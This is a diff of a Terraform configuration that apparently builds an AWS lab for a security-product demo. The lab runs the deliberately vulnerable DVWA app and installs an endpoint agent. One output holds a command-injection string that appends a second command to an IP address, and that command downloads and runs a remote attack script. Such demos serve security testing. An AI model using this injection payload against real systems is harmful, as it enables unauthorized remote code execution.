@@ -46,8 +46,8 @@ resource "aws_instance" "s1_wiz_instance" {
   curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/ubuntu/install-dvwa-ubuntu2.sh; chmod +x install-dvwa-ubuntu2.sh; ./install-dvwa-ubuntu2.sh
   curl -sLO 'https://raw.githubusercontent.com/s1-howie/s1-agents-helper/master/s1-agent-helper.sh'
   chmod +x s1-agent-helper.sh; ./s1-agent-helper.sh ${var.s1_console_prefix} ${var.s1_api_key} ${var.s1_site_token_aws} ${var.s1_agent_status}
-  #curl -sLO 'https://s1demostorageaccount.z13.web.core.windows.net/scripts/install_docker.sh'; chmod +x install_docker.sh; ./install_docker.sh
-  #docker run -d --privileged --name dvwa --restart unless-stopped -p 80:80 howiehowerton/dvwa-howie:v2
+  curl -sLO 'https://s1demostorageaccount.z13.web.core.windows.net/scripts/install_docker.sh'; chmod +x install_docker.sh; ./install_docker.sh
+  docker run -d --privileged --name dvwa --restart unless-stopped -p 8080:80 howiehowerton/dvwa-howie:v2
 EOF 
 }
 
@@ -65,6 +65,13 @@ resource "aws_security_group" "sg_s1_wiz" {
   ingress {
     from_port   = 80
     to_port     = 80
+    protocol    = "tcp"
+    cidr_blocks = [local.workstation-external-cidr]
+  }
+
+  ingress {
+    from_port   = 8080
+    to_port     = 8080
     protocol    = "tcp"
     cidr_blocks = [local.workstation-external-cidr]
   }
@@ -135,8 +142,3 @@ output "get_public_ip" {
 output "dvwa_cmd_injection_text" {
   value = "127.0.0.1; curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/main/s1-wiz-attack.sh; chmod +x s1-wiz-attack.sh; ./s1-wiz-attack.sh ${local.workstation-external-cidr}"
 }
-output "install_agent" {
-  value = "chmod +x s1-agent-helper.sh; ./s1-agent-helper.sh ${var.s1_console_prefix} ${var.s1_api_key} ${var.s1_site_token_aws} ${var.s1_agent_status}"
-}
-
-
